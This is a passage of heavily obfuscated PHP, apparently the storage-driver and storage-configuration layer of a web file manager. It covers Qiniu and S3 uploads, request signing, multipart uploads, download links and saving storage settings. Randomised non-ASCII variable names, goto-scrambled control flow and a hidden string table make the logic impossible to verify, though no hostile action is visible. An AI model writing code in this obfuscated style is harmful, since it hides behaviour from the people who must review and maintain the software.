($Bï’Ä©Ç¹ > 0) { $c§‘¡Ÿ¿Şº = $F„¥¾¤ÚŠ  + $Bï’Ä©Ç¹ - 1; $C‡¨‘ˆÓÏ• = array($ašÃÔÚ†„Ñ[1282] . $F„¥¾¤ÚŠ  . $ašÃÔÚ†„Ñ[434] . $c§‘¡Ÿ¿Şº); } $aÇòö‚â”Ù = url_request($dÃ½À“…Ò, $ašÃÔÚ†„Ñ[226], !1, $C‡¨‘ˆÓÏ•); return $aÇòö‚â”Ù[$ašÃÔÚ†„Ñ[702]] ? $aÇòö‚â”Ù[$ašÃÔÚ†„Ñ[1064]] : !1; } public function upload($FË”¶¶’ä, $EÄ¸æà¸šÓ, $CÖ†í¯† = false, $a£¡‡™µÔŸ = REPEAT_REPLACE) { $a”àÔÍ²’ = new Qiniu\Storage\UploadManager(); $f³êÈƒ§Õ = $this->auth->uploadToken($this->bucket, $FË”¶¶’ä); $aÈƒò¿–Üì = get_file_mime(get_path_ext($EÄ¸æà¸šÓ)); list($f¶ì³Ğä÷, $A¾çºõÓŠ¾) = $a”àÔÍ²’->putFile($f³êÈƒ§Õ, $FË”¶¶’ä, $EÄ¸æà¸šÓ, null, $aÈƒò¿–Üì); return $A¾çºõÓŠ¾ ? !1 : $this->getPathOuter($FË”¶¶’ä); } public function uploadFormData($FŞ”ƒÚíÛ®, $e¶Ô·Õ–’ = 3600) { return $this->uploadToken($FŞ”ƒÚíÛ®, $e¶Ô·Õ–’); } public function multiUploadFormData($BÉÊÇÎî, $DÈÔ»ĞìÛ‰ = 3600) { return $this->uploadToken($BÉÊÇÎî, $DÈÔ»ĞìÛ‰); } private function uploadToken($E³ÇšÖ–Õ, $c²¢“·äÎÀ = 3600) { goto A«ñ•ì¼‰ì; F†íä¼Ç‡„: $F‡òÄ×‡³‘ = http_type() . "\72\57\x2f\x75\x70\154\x6f\x61\144{$c©¡ô«ä…}\56\161\151\156\151\165\160\x2e\x63\x6f\x6d\57"; return array($CØÕøºÁ¼±[1286] => $cŞ³²á«, $CØÕøºÁ¼±[1287] => $F‡òÄ×‡³‘); goto b¶Á…¾£¦‡; Eø›– ŠÂ: $eºÎŞÈ˜²Ú = $E³ÇšÖ–Õ; $cŞ³²á« = $this->auth->uploadToken($this->bucket, $eºÎŞÈ˜²Ú, $A—îè’’¦Í, $dÄåÎ»£œù, !0); $c©¡ô«ä… = empty($this->region) || $this->region == $CØÕøºÁ¼±[1285] ? $CØÕøºÁ¼±[33] : $CØÕøºÁ¼±[434] . $this->region; goto F†íä¼Ç‡„; A«ñ•ì¼‰ì: $CØÕøºÁ¼± =& $_SERVER[Š‰]; $A—îè’’¦Í = $c²¢“·äÎÀ; $dÄåÎ»£œù = array($CØÕøºÁ¼±[1283] => $CØÕøºÁ¼±[1284]); goto Eø›– ŠÂ; b¶Á…¾£¦‡: } public function download($b“îšƒÚÀØ, $FŞÉº¶ìò) { goto fŠô…à¬âÜ; bŸˆ¡½µö: fclose($B©»ÄäÏµ±); return $FŞÉº¶ìò; goto e•õ¾¨½’; Eë¢ ‹ò¹î: $eœ”¼±Ÿ = 1024 * 200; $B©»ÄäÏµ± = fopen($E‹áŞçëœ±, $_SERVER[Š‰][1288]); while (!0) { $Eç…ÌÄ­ã” = $this->fileSubstr($b“îšƒÚÀØ, $F£´½…‹, $eœ”¼±Ÿ); if ($Eç…ÌÄ­ã” === !1) { return !1; } fwrite($B©»ÄäÏµ±, $Eç…ÌÄ­ã”); $F£´½…‹ += $eœ”¼±Ÿ; if (strlen($Eç…ÌÄ­ã”) < $eœ”¼±Ÿ) { break; } } goto bŸˆ¡½µö; fŠô…à¬âÜ: $E‹áŞçëœ± = IO::getPathInner(IO::mkfile($FŞÉº¶ìò)); if (!($aŒ§®Ï­†Ò = $this->link($b“îšƒÚÀØ))) { return !1; } $F£´½…‹ = 0; goto Eë¢ ‹ò¹î; e•õ¾¨½’: } public function link($f²”…åäœÀ, $dÖŸß­‚ãœ = '') { if (!$this->isFile($f²”…åäœÀ)) { return !1; } $d†¶Øİ©×¢ = $this->getHost() . $_SERVER[Š‰][8] . $this->pathEncode($f²”…åäœÀ) . $dÖŸß­‚ãœ; return $this->auth->privateDownloadUrl($d†¶Øİ©×¢, 3600 * 12); } public function fileOut($b·—Ë¹š¯Â, $f¤±‹¸¹ó = false, $Bá«œĞ»î = false, $DÇê†Óô = '') { $B¦†‰ñ…ƒ =& $_SERVER[Š‰]; if ($this->isFileOutServer()) { return $this->fileOutServer($b·—Ë¹š¯Â, $f¤±‹¸¹ó, $Bá«œĞ»î, $DÇê†Óô); } if (!$Bá«œĞ»î) { $Bá«œĞ»î = $this->pathThis($b·—Ë¹š¯Â); } $e½º‚‹Ú—  = $f¤±‹¸¹ó ? $B¦†‰ñ…ƒ[1289] . rawurlencode($Bá«œĞ»î) : $B¦†‰ñ…ƒ[33]; $Bä’ŒÍĞğ» = $this->link($b·—Ë¹š¯Â, $e½º‚‹Ú— ); $this->fileOutLink($Bä’ŒÍĞğ»); } public function fileOutServer($D‹¯›§±öç, $aìŒ†Ãê = false, $F‹Çñ—Ö‘ = false, $fÛŠ¼Ãíƒ­ = '') { parent::fileOut($D‹¯›§±öç, $aìŒ†Ãê, $F‹Çñ—Ö‘, $fÛŠ¼Ãíƒ­); } public function fileOutImage($E¬‰óŒ‘¾œ, $e¥Êø’£Ü = 250) { $FÙ¡ãÇ• = $this->link($E¬‰óŒ‘¾œ, $_SERVER[Š‰][1290] . $e¥Êø’£Ü); $this->fileOutLink($FÙ¡ãÇ•); } public function fileOutImageServer($bÆÏ«Ç¯÷, $eéÍÏŠ‹ƒ = 250) { parent::fileOutImage($bÆÏ«Ç¯÷, $eéÍÏŠ‹ƒ); } public function hashMd5($D‘éáˆÖ•) { $EÅâ“°ŠÃ‰ =& $_SERVER[Š‰]; $E“ÛáËèæ = $this->objectMeta($D‘éáˆÖ•); return isset($E“ÛáËèæ[$EÅâ“°ŠÃ‰[206]]) ? $E“ÛáËèæ[$EÅâ“°ŠÃ‰[206]] : !1; $e‹ã¹É•—Ä = $this->link($D‘éáˆÖ•, $EÅâ“°ŠÃ‰[1291]); } public function size($EõË•šö¡¹) { $bğÚ‘…ôœŠ = $this->objectMeta($EõË•šö¡¹); return $bğÚ‘…ôœŠ ? $bğÚ‘…ôœŠ[$_SERVER[Š‰][77]] : 0; } public function info($C«¸Ö‡ô½Ÿ) { if ($this->isFolder($C«¸Ö‡ô½Ÿ)) { return $this->folderInfo($C«¸Ö‡ô½Ÿ); } else { if ($this->isFile($C«¸Ö‡ô½Ÿ)) { return $this->fileInfo($C«¸Ö‡ô½Ÿ); } } return !1; } public function exist($C ØÎ–®ª‹) { return $this->isFile($C ØÎ–®ª‹) || $this->isFolder($C ØÎ–®ª‹); } public function isFile($f¯ğ–«ÔÛ¹) { return !$this->isFolder($f¯ğ–«ÔÛ¹) && $this->objectMeta($f¯ğ–«ÔÛ¹); } public function isFolder($D”ƒÛ‘¨ë) { return $this->cacheMethod($_SERVER[Š‰][197], $D”ƒÛ‘¨ë); } protected function objectMeta($D°„Í²±) { return $this->cacheMethod($_SERVER[Š‰][198], $D°„Í²±); } protected function _objectMeta($A‚Ğƒ¹Ö¿) { $f½–‹´äÍÍ =& $_SERVER[Š‰]; list($CÔ÷öãÌÃ‘, $E¯Ô…ö‡) = $this->bucketManager->stat($this->bucket, $A‚Ğƒ¹Ö¿); if ($CÔ÷öãÌÃ‘) { $CÔ÷öãÌÃ‘[$f½–‹´äÍÍ[77]] = intval($CÔ÷öãÌÃ‘[$f½–‹´äÍÍ[1277]]); } return $CÔ÷öãÌÃ‘; } protected function _isFolder($F¼Åë‘‡‡) { $CóŠ‰Âäçâ =& $_SERVER[Š‰]; if ($F¼Åë‘‡‡ == $CóŠ‰Âäçâ[33] || $F¼Åë‘‡‡ == $CóŠ‰Âäçâ[8]) { return !0; } list($Aì‘•ĞŠ¢¢, $C¿î¨Âßè›) = $this->bucketManager->listFiles($this->bucket, trim($F¼Åë‘‡‡, $CóŠ‰Âäçâ[8]) . $CóŠ‰Âäçâ[8], $CóŠ‰Âäçâ[33], 1, $CóŠ‰Âäçâ[8]); return !empty($Aì‘•ĞŠ¢¢[$CóŠ‰Âäçâ[1280]]) || !empty($Aì‘•ĞŠ¢¢[$CóŠ‰Âäçâ[1281]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($A¶ï‘ÈÉöë) { parent::__construct($A¶ï‘ÈÉöë); } public function uploadFormData($b“”–¬ñó, $A§œâğéé² = 3600) { goto aÁÓËéƒ„‡; fˆƒ¶Ş›ç³: $bŞ¥†õ„Ç = $bã†Öˆå§·[1199]; $a“×¥¯î…È = $A§œâğéé² . $bã†Öˆå§·[33]; $F§ö§â¹ºÁ = $bã†Öˆå§·[1163]; goto CÕ½š …âí; fÕ½İê×ğ‡: $A­²õ÷ó  = hash_hmac($bã†Öˆå§·[1207], $D³ÓŞ¼‹îí, $fî°Å×µÄ, !0); $D«´ô„»ø = hash_hmac($bã†Öˆå§·[1207], $bŞ¥†õ„Ç, $A­²õ÷ó , !0); $eŸêó•Û® = hash_hmac($bã†Öˆå§·[1207], $fğÚ‹‰šÒÓ, $D«´ô„»ø); goto B°Ì˜’ğó»; BÔ“ÌÄÏ´: $fğÚ‹‰šÒÓ = base64_encode(json_encode($a¥˜¨èŒÆ–)); $e²½óŸßñ¼ = hash_hmac($bã†Öˆå§·[1207], $B—À®®Ÿ¿ª, $bã†Öˆå§·[1208] . $this->secret, !0); $fî°Å×µÄ = hash_hmac($bã†Öˆå§·[1207], $this->region, $e²½óŸßñ¼, !0); goto fÕ½İê×ğ‡; dİÇÛÌè´Ë: $D³ÓŞ¼‹îí = $bã†Öˆå§·[59]; $b‘îÅ§¾‚ = gmdate($bã†Öˆå§·[1198]); $B—À®®Ÿ¿ª = gmdate($bã†Öˆå§·[703]); goto fˆƒ¶Ş›ç³; CÕ½š …âí: $d“›òÉßÏ = array($this->accessKey, $B—À®®Ÿ¿ª, $this->region, $D³ÓŞ¼‹îí, $bŞ¥†õ„Ç); $c…„ƒÇèŠÒ = implode($bã†Öˆå§·[8], $d“›òÉßÏ); $a¥˜¨èŒÆ– = array($bã†Öˆå§·[1165] => gmdate($bã†Öˆå§·[1164], strtotime($bã†Öˆå§·[1200])), $bã†Öˆå§·[1166] => array(array($bã†Öˆå§·[1168] => $this->bucket), array($bã†Öˆå§·[1167] => $Cê…İ›‚»‡), array($bã†Öˆå§·[1169], $bã†Öˆå§·[1170], $bã†Öˆå§·[33]), array($bã†Öˆå§·[1169], $bã†Öˆå§·[1201], $bã†Öˆå§·[33]), array($bã†Öˆå§·[1169], $bã†Öˆå§·[1202], $bã†Öˆå§·[33]), array($bã†Öˆå§·[1171] => $F§ö§â¹ºÁ), array($bã†Öˆå§·[1203] => $c…„ƒÇèŠÒ), array($bã†Öˆå§·[1204] => $b¥‘Ä¿´‚), array($bã†Öˆå§·[1205] => $b‘îÅ§¾‚), array($bã†Öˆå§·[1206] => $a“×¥¯î…È))); goto BÔ“ÌÄÏ´; aÁÓËéƒ„‡: $bã†Öˆå§· =& $_SERVER[Š‰]; $Cê…İ›‚»‡ = $bã†Öˆå§·[191]; $b¥‘Ä¿´‚ = $bã†Öˆå§·[1197]; goto dİÇÛÌè´Ë; B°Ì˜’ğó»: $aĞµéëÃÛ… = array($bã†Öˆå§·[209] => $bã†Öˆå§·[33], $bã†Öˆå§·[1209] => $bã†Öˆå§·[33], $bã†Öˆå§·[1167] => $Cê…İ›‚»‡, $bã†Öˆå§·[1171] => $F§ö§â¹ºÁ, $bã†Öˆå§·[1175] => $fğÚ‹‰šÒÓ, $bã†Öˆå§·[1210] => $c…„ƒÇèŠÒ, $bã†Öˆå§·[1211] => $b¥‘Ä¿´‚, $bã†Öˆå§·[1212] => $b‘îÅ§¾‚, $bã†Öˆå§·[1213] => $a“×¥¯î…È, $bã†Öˆå§·[1214] => $eŸêó•Û®, $bã†Öˆå§·[175] => $this->getHost()); return $aĞµéëÃÛ…; goto f…Ôí·ÅÄâ; f…Ôí·ÅÄâ: } public function multiUploadFormData($F÷ºá²ÔÊ—, $B›¹š ù½· = 3600) { $A§Öªá¦Á• =& $_SERVER[Š‰]; $CÏ›¸ñß²Õ = gmdate($A§Öªá¦Á•[1292]); $AİÃ ®Ê = array(); $b×Ñ²íå = $this->client->getUploadId($this->bucket, $F÷ºá²ÔÊ—, $AİÃ ®Ê); if (!$b×Ñ²íå) { return !1; } return array($A§Öªá¦Á•[219] => $b×Ñ²íå, $A§Öªá¦Á•[175] => $this->getHost() . $A§Öªá¦Á•[8] . $this->pathEncode($F÷ºá²ÔÊ—), $A§Öªá¦Á•[220] => $CÏ›¸ñß²Õ, $A§Öªá¦Á•[92] => $F÷ºá²ÔÊ—); } public function multiUploadAuthData($BóÇÖ‚é«†, $B‘³ƒ‚êì“ = array()) { goto Dµ©˜ßÌ‘; D“ëËÔ¤§Š: $DÃæ®˜ª„ = $bäŞƒˆô»Å[224]; $EŒ¯ ªÙÈ¥ = $bäŞƒˆô»Å[8] . $this->pathEncode($B©ùÄç¸ïÍ) . $cÔ’Ò²Û‡“; $cé‰ò×„ˆ = $this->client->__getSignatureV4($A £ŸÍÂĞ, $dÁË¤Ò¼ï, $DÃæ®˜ª„, $EŒ¯ ªÙÈ¥); goto AôÙ—˜‚Û°; Dµ©˜ßÌ‘: $bäŞƒˆô»Å =& $_SERVER[Š‰]; $cÔ’Ò²Û‡“ = isset($B‘³ƒ‚êì“[$bäŞƒˆô»Å[167]]) ? $B‘³ƒ‚êì“[$bäŞƒˆô»Å[167]] : $bäŞƒˆô»Å[33]; $B©ùÄç¸ïÍ = $B‘³ƒ‚êì“[$bäŞƒˆô»Å[92]]; goto E„Òğ„ ‘½; AôÙ—˜‚Û°: if (strpos($cÔ’Ò²Û‡“, $bäŞƒˆô»Å[223]) === 0) { if (isset($A £ŸÍÂĞ[$bäŞƒˆô»Å[1294]])) { $Eø”×‘”¥ = $A £ŸÍÂĞ[$bäŞƒˆô»Å[1294]]; } else { if (isset($cé‰ò×„ˆ[$bäŞƒˆô»Å[1294]])) { $Eø”×‘”¥ = $cé‰ò×„ˆ[$bäŞƒˆô»Å[1294]]; } else { $Eø”×‘”¥ = hash($bäŞƒˆô»Å[1207], $bäŞƒˆô»Å[33]); } } return array($bäŞƒˆô»Å[230] => $cé‰ò×„ˆ[$bäŞƒˆô»Å[230]], $bäŞƒˆô»Å[1294] => $Eø”×‘”¥, $bäŞƒˆô»Å[220] => $cé‰ò×„ˆ[$bäŞƒˆô»Å[1297]]); } return $cé‰ò×„ˆ[$bäŞƒˆô»Å[230]]; goto Fè—ß¡Ã„ã; d­£Ô®Ö¢Æ: if (isset($B‘³ƒ‚êì“[$bäŞƒˆô»Å[1293]])) { $A £ŸÍÂĞ[$bäŞƒˆô»Å[1294]] = $B‘³ƒ‚êì“[$bäŞƒˆô»Å[1293]]; } $CÑíÉƒÖ‰¢ = explode($bäŞƒˆô»Å[177], $this->getHost()); $dÁË¤Ò¼ï = array($bäŞƒˆô»Å[1295] => $CÑíÉƒÖ‰¢[1], $bäŞƒˆô»Å[1296] => $bäŞƒˆô»Å[33], $bäŞƒˆô»Å[209] => $bäŞƒˆô»Å[118], $bäŞƒˆô»Å[1209] => $B‘³ƒ‚êì“[$bäŞƒˆô»Å[77]]); goto D“ëËÔ¤§Š; E„Òğ„ ‘½: unset($B‘³ƒ‚êì“[$bäŞƒˆô»Å[92]]); if (isset($B‘³ƒ‚êì“[$bäŞƒˆô»Å[221]])) { return $this->listUploadParts($B©ùÄç¸ïÍ, $B‘³ƒ‚êì“); } $A £ŸÍÂĞ = array(); goto d­£Ô®Ö¢Æ; Fè—ß¡Ã„ã: } public function listUploadParts($F”Õ¿³‚œ, $b¸‘å„•Öª = array()) { goto aêëÂ¦“¼‹; A£ŒØîÉ«: $FºæÕáøé¦ = $this->client->__getSignatureV4($BÓ§ĞÍë™©, $CÕÌÑêå®, $FÍ‡Ñè†ğ®, $D¤Ë¶Æ´, $BÜ‡¬ ÑÉí); return array($AÊç“¿ÈØÈ[230] => $FºæÕáøé¦[$AÊç“¿ÈØÈ[230]], $AÊç“¿ÈØÈ[220] => $FºæÕáøé¦[$AÊç“¿ÈØÈ[1297]], $AÊç“¿ÈØÈ[232] => $dË±ÍÌ¯§Ø, $AÊç“¿ÈØÈ[1294] => $FºæÕáøé¦[$AÊç“¿ÈØÈ[1294]]); goto eÛ›™Äø¢è; b´ç×îØ½¯: if (!$dË±ÍÌ¯§Ø) { return !1; } $BÜ‡¬ ÑÉí = $AÊç“¿ÈØÈ[1298]; foreach ($dË±ÍÌ¯§Ø as $cÌˆê•à­º) { $BÜ‡¬ ÑÉí .= $AÊç“¿ÈØÈ[1299] . "\x3c\120\x61\x72\164\116\165\155\x62\x65\162\x3e{$cÌˆê•à­º[$AÊç“¿ÈØÈ[1254]]}\74\57\120\141\162\x74\116\165\155\142\x65\x72\x3e\12" . "\x3c\105\x54\141\147\x3e{$cÌˆê•à­º[$AÊç“¿ÈØÈ[1255]]}\x3c\x2f\105\x54\141\147\76\12" . $AÊç“¿ÈØÈ[1300]; } goto BÅ½’ù¦ùà; a„Œ¼ŒÇ¾: $CÕÌÑêå® = array($AÊç“¿ÈØÈ[1295] => $f×±Ã„è‹³[1], $AÊç“¿ÈØÈ[209] => $AÊç“¿ÈØÈ[118], $AÊç“¿ÈØÈ[1209] => strlen($BÜ‡¬ ÑÉí)); $FÍ‡Ñè†ğ® = $AÊç“¿ÈØÈ[222]; $D¤Ë¶Æ´ = $AÊç“¿ÈØÈ[8] . $this->pathEncode($F”Õ¿³‚œ) . $b¸‘å„•Öª[$AÊç“¿ÈØÈ[167]]; goto A£ŒØîÉ«; BÅ½’ù¦ùà: $BÜ‡¬ ÑÉí .= $AÊç“¿ÈØÈ[1301]; $BÓ§ĞÍë™© = array(); $f×±Ã„è‹³ = explode($AÊç“¿ÈØÈ[177], $this->getHost()); goto a„Œ¼ŒÇ¾; aêëÂ¦“¼‹: $AÊç“¿ÈØÈ =& $_SERVER[Š‰]; $E¿˜¤ŒåØæ = str_replace($AÊç“¿ÈØÈ[231], $AÊç“¿ÈØÈ[33], $b¸‘å„•Öª[$AÊç“¿ÈØÈ[167]]); $dË±ÍÌ¯§Ø = $this->client->listParts($this->bucket, $F”Õ¿³‚œ, $E¿˜¤ŒåØæ); goto b´ç×îØ½¯; eÛ›™Äø¢è: } public function link($A‰¦“‰ô„, $dÂƒ´ğÌƒ = array()) { return parent::link($A‰¦“‰ô„, $dÂƒ´ğÌƒ); } public function fileOut($EÈÁ¢ÆÅ°, $fîæ¦«ïÎ = false, $EåÚ‡ôÍ¡ø = false, $b©ŒŠœ§òæ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[Š‰][1302])) { return parent::fileOutServer($EÈÁ¢ÆÅ°, $fîæ¦«ïÎ, $EåÚ‡ôÍ¡ø, $b©ŒŠœ§òæ); } parent::fileOut($EÈÁ¢ÆÅ°, $fîæ¦«ïÎ, $EåÚ‡ôÍ¡ø, $b©ŒŠœ§òæ); } public function fileOutImage($EßÉƒ‚Ëï, $d•©ŠÖ›Õ¹ = 250) { if (strstr($this->endpoint, $_SERVER[Š‰][1302])) { return parent::fileOutImageServer($EßÉƒ‚Ëï, $d•©ŠÖ›Õ¹); } parent::fileOutImage($EßÉƒ‚Ëï, $d•©ŠÖ›Õ¹); } public function fileOutLink($eÎá¼ñ‰˜Ü) { $fèùèÚĞ½ =& $_SERVER[Š‰]; if (substr($eÎá¼ñ‰˜Ü, 0, 7) == $fèùèÚĞ½[1178]) { $eÎá¼ñ‰˜Ü = $fèùèÚĞ½[1179] . substr($eÎá¼ñ‰˜Ü, 7); } header($fèùèÚĞ½[158] . $eÎá¼ñ‰˜Ü); die; } public function getHost() { $A£»íå«×Ç =& $_SERVER[Š‰]; $f¸ô‹áä×ß = str_rtrim(parent::getHost(), $A£»íå«×Ç[8] . $this->bucket); $f¸ô‹áä×ß = explode($A£»íå«×Ç[177], $f¸ô‹áä×ß); return $f¸ô‹áä×ß[0] . $A£»íå«×Ç[177] . $this->bucket . $A£»íå«×Ç[94] . $f¸ô‹áä×ß[1]; } } goto cÓÏ¥“öíÓ; aÆŞ…Õ˜: class StorageModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\x65\155\x2e\x73\164\157\x72\x61\147\145\x4c\151\163\164"; public $field = array("\x6e\x61\x6d\145", "\x73\x69\x7a\x65\x4d\141\170", "\x73\171\x73\164\x65\155", "\x64\x65\x66\x61\165\x6c\164", "\x64\x72\151\166\145\x72", "\143\157\156\146\151\x67"); public function listData($eøÛËÓƒã = false, $F‡ùš³Òİô = "\155\157\x64\x69\146\171\124\151\155\x65", $f…´Œ„îÔé = false) { $E¸Ù®‰›ã¥ =& $_SERVER[Š‰]; $dÌÓ‚À©Ñ = parent::listData($eøÛËÓƒã, $F‡ùš³Òİô, $f…´Œ„îÔé); if ($eøÛËÓƒã) { return $dÌÓ‚À©Ñ; } $e¾…­Ö¾õ = $this->ioSizeUseGet(array_to_keyvalue($dÌÓ‚À©Ñ, $E¸Ù®‰›ã¥[33], $E¸Ù®‰›ã¥[388])); foreach ($dÌÓ‚À©Ñ as $c˜Àİ¢Â‰ => $Bó×À¼ëÉ») { unset($dÌÓ‚À©Ñ[$c˜Àİ¢Â‰][$E¸Ù®‰›ã¥[6]]); $dÌÓ‚À©Ñ[$c˜Àİ¢Â‰][$E¸Ù®‰›ã¥[1649]] = isset($e¾…­Ö¾õ[$Bó×À¼ëÉ»[$E¸Ù®‰›ã¥[388]]]) ? $e¾…­Ö¾õ[$Bó×À¼ëÉ»[$E¸Ù®‰›ã¥[388]]] : 0; } return $dÌÓ‚À©Ñ; } public function ioSizeUseGet($bï§‘°¡æî) { goto e…£ö®õ¦©; e…£ö®õ¦©: $Eï¿ì¢àÒò =& $_SERVER[Š‰]; if (!$bï§‘°¡æî) { return array(); } $Aô£—õÜÀ– = $Eï¿ì¢àÒò[1964] . implode($Eï¿ì¢àÒò[47], $bï§‘°¡æî); goto AÒ¶æ§Ú»†; AÒ¶æ§Ú»†: $DÂµç¼ì¡± = Cache::get($Aô£—õÜÀ–); if ($DÂµç¼ì¡±) { return $DÂµç¼ì¡±; } $Fõ Ÿ—ˆ«Ê = array($Eï¿ì¢àÒò[768] => $Eï¿ì¢àÒò[388], $Eï¿ì¢àÒò[1965] => $Eï¿ì¢àÒò[77]); goto Cˆâ®Î¬õ²; f­âÆ—È×Ã: Cache::set($Aô£—õÜÀ–, $DÂµç¼ì¡±, 60); return $DÂµç¼ì¡±; goto Eæ½Òœ™÷ê; Cˆâ®Î¬õ²: $DÄ§Ü·®á = array($Eï¿ì¢àÒò[768] => array($Eï¿ì¢àÒò[7], $bï§‘°¡æî)); $DÂµç¼ì¡± = Model($Eï¿ì¢àÒò[731])->field($Fõ Ÿ—ˆ«Ê)->where($DÄ§Ü·®á)->group($Eï¿ì¢àÒò[768])->select(); $DÂµç¼ì¡± = array_to_keyvalue($DÂµç¼ì¡±, $Eï¿ì¢àÒò[388], $Eï¿ì¢àÒò[77]); goto f­âÆ—È×Ã; Eæ½Òœ™÷ê: } public function getConfig($e¯‰â²‘ªß) { $bù—É’‡¶§ = parent::listData($e¯‰â²‘ªß); return json_decode($bù—É’‡¶§[$_SERVER[Š‰][6]], !0); } public function update($f˜ğº÷µ‰œ, $BÃïØ§š») { goto B Ÿëõ¼ŞÇ; B Ÿëõ¼ŞÇ: $a§œÓ˜¡ËÉ =& $_SERVER[Š‰]; $F½¿ª¦Øëš = $BÃïØ§š»[$a§œÓ˜¡ËÉ[28]]; $BÌ¾ôÚÑÑó = array_to_keyvalue(parent::listData(), $a§œÓ˜¡ËÉ[28]); goto dŸÓ‹é˜¼; c÷°øœè…: $EÑ¤­Š×…“ = parent::update($f˜ğº÷µ‰œ, $BÃïØ§š»); if ($EÑ¤­Š×…“ && $BÃïØ§š»[$a§œÓ˜¡ËÉ[34]]) { foreach ($BÌ¾ôÚÑÑó as $eŒ³®è›³à) { if ($eŒ³®è›³à[$a§œÓ˜¡ËÉ[34]] && $eŒ³®è›³à[$a§œÓ˜¡ËÉ[388]] != $f˜ğº÷µ‰œ) { parent::update($eŒ³®è›³à[$a§œÓ˜¡ËÉ[388]], array($a§œÓ˜¡ËÉ[34] => 0)); } } } return $EÑ¤­Š×…“; goto CÊä²µ“´Ï; dŸÓ‹é˜¼: if (isset($BÌ¾ôÚÑÑó[$F½¿ª¦Øëš]) && $BÌ¾ôÚÑÑó[$F½¿ª¦Øëš][$a§œÓ˜¡ËÉ[388]] != $f˜ğº÷µ‰œ) { return !1; } if (isset($BÃïØ§š»[$a§œÓ˜¡ËÉ[1966]]) && $BÃïØ§š»[$a§œÓ˜¡ËÉ[1966]] == $a§œÓ˜¡ËÉ[86]) { $this->checkConfig($BÃïØ§š»); } unset($BÃïØ§š»[$a§œÓ˜¡ËÉ[1966]]); goto c÷°øœè…; CÊä²µ“´Ï: } public function add($cñ ôô ôì) { goto f¦Ñ‡ÈºãÚ; f¦Ñ‡ÈºãÚ: $AˆÉ±åÏÂè =& $_SERVER[Š‰]; $e¤Éø†›ÁÖ = array_to_keyvalue(parent::listData(), $AˆÉ±åÏÂè[28]); if (isset($e¤Éø†›ÁÖ[$cñ ôô ôì[$AˆÉ±åÏÂè[28]]])) { return !1; } goto AÆ§¨ Ÿ½; d¤Ùºóç¶„: return $AßŠà«¾; goto CäÂ³İ†Û«; AÆ§¨ Ÿ½: $this->checkConfig($cñ ôô ôì); $AßŠà«¾ = parent::insert($cñ ôô ôì); if ($AßŠà«¾ && $cñ ôô ôì[$AˆÉ±åÏÂè[34]]) { foreach ($e¤Éø†›ÁÖ as $f‡éäêğç) { if ($f‡éäêğç[$AˆÉ±åÏÂè[34]]) { parent::update($f‡éäêğç[$AˆÉ±åÏÂè[388]], array($AˆÉ±åÏÂè[34] => 0)); } } } goto d¤Ùºóç¶„; CäÂ³İ†Û«: } public function checkConfig(&$B·¶ ää±­) { goto AĞñ‚õ·‹; AĞñ‚õ·‹: $BÉÜ¤ =& $_SERVER[Š‰]; $d„Ş³ä°å‡ = strtolower($B·¶ ää±­[$BÉÜ¤[93]]); $Bæ±ÃŠ…ñğ = json_decode($B·¶ ää±­[$BÉÜ¤[6]], !0); goto FÒ÷½‹Ğ; d¨”ª†‡­«: $B·¶ ää±­[$BÉÜ¤[6]] = json_encode($Bæ±ÃŠ…ñğ); $B·¶ ää±­[$BÉÜ¤[93]] = $D×ëÀä„´; return !0; goto DÙ¥ÈÂïÈÙ; C²ğÂ¬¢Ï÷: $A®¡ã„ÌÛÕ = $DÄ³Š×Ê—¾->getPath($aÑâË²ªÆÍ . $BÉÜ¤[1113]); if (!$DÄ³Š×Ê—¾->mkfile($A®¡ã„ÌÛÕ)) { show_json(LNG($BÉÜ¤[1971]), !1); } $Bæ±ÃŠ…ñğ[$BÉÜ¤[1052]] = $aÑâË²ªÆÍ; goto d¨”ª†‡­«; F–è›Şê¾: $DÄ³Š×Ê—¾ = new $eÓ¨”•õŸï($Bæ±ÃŠ…ñğ); if (in_array($d„Ş³ä°å‡, $DÄ³Š×Ê—¾->objectDriver)) { if (!$DÄ³Š×Ê—¾->isBucketCors() && !$DÄ³Š×Ê—¾->setBucketCors()) { $AÕµÁ³™†– = LNG($BÉÜ¤[1971]); $AÕµÁ³™†– .= $BÉÜ¤[1972] . LNG($BÉÜ¤[1973]); show_json($AÕµÁ³™†–, !1); } } $aÑâË²ªÆÍ = rtrim($Bæ±ÃŠ…ñğ[$BÉÜ¤[1052]], $BÉÜ¤[8]) . $BÉÜ¤[8]; goto C²ğÂ¬¢Ï÷; e¡Ö¥‰Ø: $D×ëÀä„´ = isset($AÆ•ªİŒ­í[$d„Ş³ä°å‡]) ? $AÆ•ªİŒ­í[$d„Ş³ä°å‡] : ucfirst($d„Ş³ä°å‡); $eÓ¨”•õŸï = $BÉÜ¤[71] . $D×ëÀä„´; if (!$D×ëÀä„´ || !class_exists($eÓ¨”•õŸï)) { write_log(array($BÉÜ¤[1968], $B·¶ ää±­, get_caller_info()), $BÉÜ¤[1969]); show_json(LNG($BÉÜ¤[1970]), !1, $B·¶ ää±­); } goto F–è›Şê¾; FÒ÷½‹Ğ: foreach ($Bæ±ÃŠ…ñğ as $d øãÛ—×ö => $b°Æ‡ŒÆó) { $Bæ±ÃŠ…ñğ[$d øãÛ—×ö] = trim($b°Æ‡ŒÆó); } $Bæ±ÃŠ…ñğ[$BÉÜ¤[1967]] = rand_string(6); $AÆ•ªİŒ­í = $GLOBALS[$BÉÜ¤[6]][$BÉÜ¤[87]][$BÉÜ¤[776]]; goto e¡Ö¥‰Ø; DÙ¥ÈÂïÈÙ: } public function driverListSystem() { $Fô¹ÃêÇŒ =& $_SERVER[Š‰]; $c˜ù×Æ¾¬‡ = parent::listData(); $d‰ùìŒôÌ = array(); foreach ($c˜ù×Æ¾¬‡ as $EˆÑ‘Ëé¬§) { unset($EˆÑ‘Ëé¬§[$Fô¹ÃêÇŒ[192]], $EˆÑ‘Ëé¬§[$Fô¹ÃêÇŒ[83]]); $EˆÑ‘Ëé¬§[$Fô¹ÃêÇŒ[6]] = json_decode($EˆÑ‘Ëé¬§[$Fô¹ÃêÇŒ[6]], !0); $d‰ùìŒôÌ[] = $EˆÑ‘Ëé¬§; } return $d‰ùìŒôÌ; } public function defaultDriver() { $càÖŠ±¡‹· =& $_SERVER[Š‰]; $E­ÑÔÄ„ì¬ = parent::listData(); $Fî…™¢’¥¼ = array_filter_by_field($E­ÑÔÄ„ì¬, $càÖŠ±¡‹·[34], 